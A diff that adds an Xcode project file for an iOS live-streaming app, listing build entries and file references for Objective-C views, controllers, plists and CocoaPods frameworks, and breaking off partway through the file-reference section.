@@ -1,0 +1,1313 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		18F0B44528C610B5002E696D /* NSString+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD6828C610AE002E696D /* NSString+KKObjcSugar.m */; };
+		18F0B44728C610B5002E696D /* NSNull+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD6A28C610AE002E696D /* NSNull+KKObjcSugar.m */; };
+		18F0B44828C610B5002E696D /* UIColor+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD6F28C610AE002E696D /* UIColor+KKObjcSugar.m */; };
+		18F0B44928C610B5002E696D /* NSDate+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD7028C610AE002E696D /* NSDate+KKObjcSugar.m */; };
+		18F0B44B28C610B5002E696D /* UIView+KKSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD7228C610AE002E696D /* UIView+KKSugar.m */; };
+		18F0B44C28C610B5002E696D /* NSURL+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD7328C610AE002E696D /* NSURL+KKObjcSugar.m */; };
+		18F0B44E28C610B5002E696D /* UIButton+KKObjcSugar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD7828C610AE002E696D /* UIButton+KKObjcSugar.m */; };
+		18F0B45328C610B5002E696D /* KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist in Resources */ = {isa = PBXBuildFile; fileRef = 18F0AD8528C610AE002E696D /* KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist */; };
+		18F0B45528C610B5002E696D /* KKGameRoomTopInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 18F0AD8728C610AE002E696D /* KKGameRoomTopInfo.plist */; };
+		18F0B45628C610B5002E696D /* KKGameRoomMoreFunctionInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 18F0AD8828C610AE002E696D /* KKGameRoomMoreFunctionInfo.plist */; };
+		18F0B45928C610B5002E696D /* kkUserInfoVC_liveing.gif in Resources */ = {isa = PBXBuildFile; fileRef = 18F0AD8C28C610AE002E696D /* kkUserInfoVC_liveing.gif */; };
+		18F0B45D28C610B5002E696D /* YBBaseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AD9128C610AE002E696D /* YBBaseViewController.m */; };
+		18F0B48F28C610B6002E696D /* KKLiveViewerViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE2028C610AE002E696D /* KKLiveViewerViewController.m */; };
+		18F0B49128C610B6002E696D /* KKTRTCChatTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE2728C610AE002E696D /* KKTRTCChatTableViewCell.m */; };
+		18F0B49228C610B6002E696D /* KKTRTCLiveInvitationView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE2828C610AE002E696D /* KKTRTCLiveInvitationView.m */; };
+		18F0B49628C610B6002E696D /* KKLiveRoomUserOnlineView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3128C610AE002E696D /* KKLiveRoomUserOnlineView.m */; };
+		18F0B49728C610B6002E696D /* KKRoomOnlinePersonCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3228C610AE002E696D /* KKRoomOnlinePersonCell.m */; };
+		18F0B49828C610B6002E696D /* KKTRTCChoiceVideoCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3328C610AE002E696D /* KKTRTCChoiceVideoCell.m */; };
+		18F0B49928C610B6002E696D /* KKTRTCVideoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3428C610AE002E696D /* KKTRTCVideoView.m */; };
+		18F0B49A28C610B6002E696D /* KKTRTCChoiceVideoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3528C610AE002E696D /* KKTRTCChoiceVideoView.m */; };
+		18F0B49B28C610B6002E696D /* KKSocketChatView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3E28C610AE002E696D /* KKSocketChatView.m */; };
+		18F0B49C28C610B6002E696D /* KKLiveRoomScrollView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE3F28C610AE002E696D /* KKLiveRoomScrollView.m */; };
+		18F0B49D28C610B6002E696D /* KKLiveViewerView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4128C610AE002E696D /* KKLiveViewerView.m */; };
+		18F0B49E28C610B6002E696D /* KKTRTCVoiceView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4228C610AE002E696D /* KKTRTCVoiceView.m */; };
+		18F0B49F28C610B6002E696D /* KKLiveRoomActivityView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4528C610AE002E696D /* KKLiveRoomActivityView.m */; };
+		18F0B4A028C610B6002E696D /* KKUserInfoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4628C610AE002E696D /* KKUserInfoView.m */; };
+		18F0B4A128C610B6002E696D /* KKTRTCVoiceCollectionViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4728C610AE002E696D /* KKTRTCVoiceCollectionViewCell.m */; };
+		18F0B4A228C610B6002E696D /* KKLiveBottomMenuView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4B28C610AE002E696D /* KKLiveBottomMenuView.m */; };
+		18F0B4A328C610B6002E696D /* KKLiveVideoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE4E28C610AE002E696D /* KKLiveVideoView.m */; };
+		18F0B4AD28C610B6002E696D /* KKTextToolBar.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE6428C610AE002E696D /* KKTextToolBar.m */; };
+		18F0B4AE28C610B6002E696D /* KKHorizontalUserInfoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE6528C610AE002E696D /* KKHorizontalUserInfoView.m */; };
+		18F0B4AF28C610B6002E696D /* KKHorizontalView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE6928C610AE002E696D /* KKHorizontalView.m */; };
+		18F0B4B528C610B6002E696D /* KKCommendatoryLiveRoomView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE7628C610AE002E696D /* KKCommendatoryLiveRoomView.m */; };
+		18F0B4B628C610B6002E696D /* KKCommendatoryLiveRoomCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE7728C610AE002E696D /* KKCommendatoryLiveRoomCell.m */; };
+		18F0B4B728C610B6002E696D /* KKLotteryAnimationView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE7828C610AE002E696D /* KKLotteryAnimationView.m */; };
+		18F0B4B828C610B6002E696D /* KKShowRoomTitleView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE7928C610AE002E696D /* KKShowRoomTitleView.m */; };
+		18F0B4B928C610B6002E696D /* KKLiveUserComeRoomAnimationView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE7E28C610AE002E696D /* KKLiveUserComeRoomAnimationView.m */; };
+		18F0B4BB28C610B6002E696D /* KKLiveSocketInfoModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE8328C610AE002E696D /* KKLiveSocketInfoModel.m */; };
+		18F0B4BC28C610B6002E696D /* KKLiveViewerInfoModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE8428C610AE002E696D /* KKLiveViewerInfoModel.m */; };
+		18F0B4C028C610B6002E696D /* KKLivebroadcastController.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AE8F28C610AE002E696D /* KKLivebroadcastController.m */; };
+		18F0B4CA28C610B6002E696D /* KKLiveTelecastView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AEAA28C610AE002E696D /* KKLiveTelecastView.m */; };
+		18F0B50928C610B7002E696D /* KKRobRedBagTopCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AF4328C610AF002E696D /* KKRobRedBagTopCell.m */; };
+		18F0B50A28C610B7002E696D /* KKRobRedBagView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AF4428C610AF002E696D /* KKRobRedBagView.m */; };
+		18F0B50B28C610B7002E696D /* KKRobRedBagCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AF4528C610AF002E696D /* KKRobRedBagCell.m */; };
+		18F0B50C28C610B7002E696D /* KKSendRedBagView.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0AF4628C610AF002E696D /* KKSendRedBagView.m */; };
+		18F0B58F28C610B8002E696D /* KKChatConfig.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B09C28C610B0002E696D /* KKChatConfig.m */; };
+		18F0B59128C610B8002E696D /* KKInfoCache.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B09E28C610B0002E696D /* KKInfoCache.m */; };
+		18F0B59328C610B8002E696D /* KKMyBeautyCache.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B0A428C610B0002E696D /* KKMyBeautyCache.m */; };
+		18F0B59828C610B8002E696D /* KKHTTPNetWorkTool.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B0B028C610B0002E696D /* KKHTTPNetWorkTool.m */; };
+		18F0B59A28C610B8002E696D /* YBToolClass.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B0B328C610B0002E696D /* YBToolClass.m */; };
+		18F0B59D28C610B8002E696D /* KKLiveAPI.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B0B828C610B0002E696D /* KKLiveAPI.m */; };
+		18F0B59F28C610B9002E696D /* KKBaseModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B0BD28C610B0002E696D /* KKBaseModel.m */; };
+		18F0B5A328C6E13A002E696D /* JX_GCDTimerManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 18F0B5A228C6E13A002E696D /* JX_GCDTimerManager.m */; };
+		18FBEE0F2817FF850069F226 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18FBEE0E2817FF850069F226 /* Assets.xcassets */; };
+		18FBEE122817FF850069F226 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 18FBEE102817FF850069F226 /* LaunchScreen.storyboard */; };
+		18FBEE152817FF860069F226 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBEE142817FF860069F226 /* main.m */; };
+		18FBEE1F2817FF860069F226 /* _1testTests.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBEE1E2817FF860069F226 /* _1testTests.m */; };
+		18FBEE2A2817FF860069F226 /* _1testUITests.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBEE292817FF860069F226 /* _1testUITests.m */; };
+		18FBEF85281804DA0069F226 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBEF81281804DA0069F226 /* AppDelegate.m */; };
+		18FBEF86281804DA0069F226 /* SceneDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBEF84281804DA0069F226 /* SceneDelegate.m */; };
+		18FBF10E281805070069F226 /* LDSearchDeviceViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FBF014281805050069F226 /* LDSearchDeviceViewController.m */; };
+		18FCFA0D28B7067B006A8452 /* TCNavigationController.m in Sources */ = {isa = PBXBuildFile; fileRef = 18FCFA0B28B7067B006A8452 /* TCNavigationController.m */; };
+		61F127706BF044662C60A7E0 /* Pods_Live_LiveUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E3611280E36C5C881F46795A /* Pods_Live_LiveUITests.framework */; };
+		BAA40F0832C8C954EB848011 /* Pods_Live.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 015D1391F5B8D53FBEF7744D /* Pods_Live.framework */; };
+		C2D32F4920CCA595D3327065 /* Pods_LiveTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D286A0DA691EDC84FDAF2B0D /* Pods_LiveTests.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		18FBEE1B2817FF860069F226 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 18FBEDF72817FF820069F226 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 18FBEDFE2817FF820069F226;
+			remoteInfo = Live;
+		};
+		18FBEE262817FF860069F226 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 18FBEDF72817FF820069F226 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 18FBEDFE2817FF820069F226;
+			remoteInfo = Live;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		015D1391F5B8D53FBEF7744D /* Pods_Live.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Live.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		0C0076CA632740093C4D7F39 /* Pods-Live-LiveUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Live-LiveUITests.release.xcconfig"; path = "Target Support Files/Pods-Live-LiveUITests/Pods-Live-LiveUITests.release.xcconfig"; sourceTree = "<group>"; };
+		18F0AD6128C610AE002E696D /* NSURL+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSURL+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD6328C610AE002E696D /* UIView+KKSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIView+KKSugar.h"; sourceTree = "<group>"; };
+		18F0AD6528C610AE002E696D /* NSDate+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSDate+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD6628C610AE002E696D /* UIColor+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIColor+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD6828C610AE002E696D /* NSString+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSString+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD6A28C610AE002E696D /* NSNull+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSNull+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD6B28C610AE002E696D /* UIButton+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIButton+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD6F28C610AE002E696D /* UIColor+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIColor+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD7028C610AE002E696D /* NSDate+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSDate+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD7228C610AE002E696D /* UIView+KKSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIView+KKSugar.m"; sourceTree = "<group>"; };
+		18F0AD7328C610AE002E696D /* NSURL+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSURL+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD7528C610AE002E696D /* NSString+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSString+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD7628C610AE002E696D /* NSNull+KKObjcSugar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSNull+KKObjcSugar.h"; sourceTree = "<group>"; };
+		18F0AD7828C610AE002E696D /* UIButton+KKObjcSugar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIButton+KKObjcSugar.m"; sourceTree = "<group>"; };
+		18F0AD8528C610AE002E696D /* KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist; sourceTree = "<group>"; };
+		18F0AD8728C610AE002E696D /* KKGameRoomTopInfo.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = KKGameRoomTopInfo.plist; sourceTree = "<group>"; };
+		18F0AD8828C610AE002E696D /* KKGameRoomMoreFunctionInfo.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = KKGameRoomMoreFunctionInfo.plist; sourceTree = "<group>"; };
+		18F0AD8C28C610AE002E696D /* kkUserInfoVC_liveing.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = kkUserInfoVC_liveing.gif; sourceTree = "<group>"; };
+		18F0AD9128C610AE002E696D /* YBBaseViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = YBBaseViewController.m; sourceTree = "<group>"; };
+		18F0AD9228C610AE002E696D /* YBBaseViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = YBBaseViewController.h; sourceTree = "<group>"; };
+		18F0AD9428C610AE002E696D /* KKHttpAPIConfigure.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKHttpAPIConfigure.h; sourceTree = "<group>"; };
+		18F0AD9528C610AE002E696D /* KKChatMacroDefinition.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKChatMacroDefinition.h; sourceTree = "<group>"; };
+		18F0AD9628C610AE002E696D /* KKAPPInfoConfigure.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKAPPInfoConfigure.h; sourceTree = "<group>"; };
+		18F0AD9728C610AE002E696D /* KKMacroDefinition.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKMacroDefinition.h; sourceTree = "<group>"; };
+		18F0AE1E28C610AE002E696D /* KKLiveViewerViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveViewerViewController.h; sourceTree = "<group>"; };
+		18F0AE2028C610AE002E696D /* KKLiveViewerViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveViewerViewController.m; sourceTree = "<group>"; };
+		18F0AE2728C610AE002E696D /* KKTRTCChatTableViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCChatTableViewCell.m; sourceTree = "<group>"; };
+		18F0AE2828C610AE002E696D /* KKTRTCLiveInvitationView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCLiveInvitationView.m; sourceTree = "<group>"; };
+		18F0AE2C28C610AE002E696D /* KKTRTCLiveInvitationView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCLiveInvitationView.h; sourceTree = "<group>"; };
+		18F0AE2D28C610AE002E696D /* KKTRTCChatTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCChatTableViewCell.h; sourceTree = "<group>"; };
+		18F0AE3128C610AE002E696D /* KKLiveRoomUserOnlineView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveRoomUserOnlineView.m; sourceTree = "<group>"; };
+		18F0AE3228C610AE002E696D /* KKRoomOnlinePersonCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKRoomOnlinePersonCell.m; sourceTree = "<group>"; };
+		18F0AE3328C610AE002E696D /* KKTRTCChoiceVideoCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCChoiceVideoCell.m; sourceTree = "<group>"; };
+		18F0AE3428C610AE002E696D /* KKTRTCVideoView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCVideoView.m; sourceTree = "<group>"; };
+		18F0AE3528C610AE002E696D /* KKTRTCChoiceVideoView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCChoiceVideoView.m; sourceTree = "<group>"; };
+		18F0AE3628C610AE002E696D /* KKLiveRoomUserOnlineView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveRoomUserOnlineView.h; sourceTree = "<group>"; };
+		18F0AE3728C610AE002E696D /* KKRoomOnlinePersonCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKRoomOnlinePersonCell.h; sourceTree = "<group>"; };
+		18F0AE3828C610AE002E696D /* KKTRTCChoiceVideoCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCChoiceVideoCell.h; sourceTree = "<group>"; };
+		18F0AE3928C610AE002E696D /* KKTRTCChoiceVideoView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCChoiceVideoView.h; sourceTree = "<group>"; };
+		18F0AE3A28C610AE002E696D /* KKTRTCVideoView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCVideoView.h; sourceTree = "<group>"; };
+		18F0AE3D28C610AE002E696D /* KKUserInfoView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKUserInfoView.h; sourceTree = "<group>"; };
+		18F0AE3E28C610AE002E696D /* KKSocketChatView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKSocketChatView.m; sourceTree = "<group>"; };
+		18F0AE3F28C610AE002E696D /* KKLiveRoomScrollView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveRoomScrollView.m; sourceTree = "<group>"; };
+		18F0AE4028C610AE002E696D /* KKTRTCVoiceCollectionViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCVoiceCollectionViewCell.h; sourceTree = "<group>"; };
+		18F0AE4128C610AE002E696D /* KKLiveViewerView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveViewerView.m; sourceTree = "<group>"; };
+		18F0AE4228C610AE002E696D /* KKTRTCVoiceView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCVoiceView.m; sourceTree = "<group>"; };
+		18F0AE4328C610AE002E696D /* KKLiveBottomMenuView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveBottomMenuView.h; sourceTree = "<group>"; };
+		18F0AE4428C610AE002E696D /* KKLiveVideoView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveVideoView.h; sourceTree = "<group>"; };
+		18F0AE4528C610AE002E696D /* KKLiveRoomActivityView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveRoomActivityView.m; sourceTree = "<group>"; };
+		18F0AE4628C610AE002E696D /* KKUserInfoView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKUserInfoView.m; sourceTree = "<group>"; };
+		18F0AE4728C610AE002E696D /* KKTRTCVoiceCollectionViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTRTCVoiceCollectionViewCell.m; sourceTree = "<group>"; };
+		18F0AE4828C610AE002E696D /* KKLiveRoomScrollView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveRoomScrollView.h; sourceTree = "<group>"; };
+		18F0AE4928C610AE002E696D /* KKSocketChatView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKSocketChatView.h; sourceTree = "<group>"; };
+		18F0AE4A28C610AE002E696D /* KKTRTCVoiceView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTRTCVoiceView.h; sourceTree = "<group>"; };
+		18F0AE4B28C610AE002E696D /* KKLiveBottomMenuView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveBottomMenuView.m; sourceTree = "<group>"; };
+		18F0AE4C28C610AE002E696D /* KKLiveViewerView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveViewerView.h; sourceTree = "<group>"; };
+		18F0AE4D28C610AE002E696D /* KKLiveRoomActivityView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveRoomActivityView.h; sourceTree = "<group>"; };
+		18F0AE4E28C610AE002E696D /* KKLiveVideoView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveVideoView.m; sourceTree = "<group>"; };
+		18F0AE6428C610AE002E696D /* KKTextToolBar.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKTextToolBar.m; sourceTree = "<group>"; };
+		18F0AE6528C610AE002E696D /* KKHorizontalUserInfoView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKHorizontalUserInfoView.m; sourceTree = "<group>"; };
+		18F0AE6628C610AE002E696D /* KKHorizontalView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKHorizontalView.h; sourceTree = "<group>"; };
+		18F0AE6728C610AE002E696D /* KKTextToolBar.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKTextToolBar.h; sourceTree = "<group>"; };
+		18F0AE6828C610AE002E696D /* KKHorizontalUserInfoView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKHorizontalUserInfoView.h; sourceTree = "<group>"; };
+		18F0AE6928C610AE002E696D /* KKHorizontalView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKHorizontalView.m; sourceTree = "<group>"; };
+		18F0AE7628C610AE002E696D /* KKCommendatoryLiveRoomView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKCommendatoryLiveRoomView.m; sourceTree = "<group>"; };
+		18F0AE7728C610AE002E696D /* KKCommendatoryLiveRoomCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKCommendatoryLiveRoomCell.m; sourceTree = "<group>"; };
+		18F0AE7828C610AE002E696D /* KKLotteryAnimationView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLotteryAnimationView.m; sourceTree = "<group>"; };
+		18F0AE7928C610AE002E696D /* KKShowRoomTitleView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKShowRoomTitleView.m; sourceTree = "<group>"; };
+		18F0AE7A28C610AE002E696D /* KKLiveUserComeRoomAnimationView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveUserComeRoomAnimationView.h; sourceTree = "<group>"; };
+		18F0AE7B28C610AE002E696D /* KKCommendatoryLiveRoomView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKCommendatoryLiveRoomView.h; sourceTree = "<group>"; };
+		18F0AE7C28C610AE002E696D /* KKCommendatoryLiveRoomCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKCommendatoryLiveRoomCell.h; sourceTree = "<group>"; };
+		18F0AE7D28C610AE002E696D /* KKLotteryAnimationView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLotteryAnimationView.h; sourceTree = "<group>"; };
+		18F0AE7E28C610AE002E696D /* KKLiveUserComeRoomAnimationView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveUserComeRoomAnimationView.m; sourceTree = "<group>"; };
+		18F0AE7F28C610AE002E696D /* KKShowRoomTitleView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKShowRoomTitleView.h; sourceTree = "<group>"; };
+		18F0AE8328C610AE002E696D /* KKLiveSocketInfoModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveSocketInfoModel.m; sourceTree = "<group>"; };
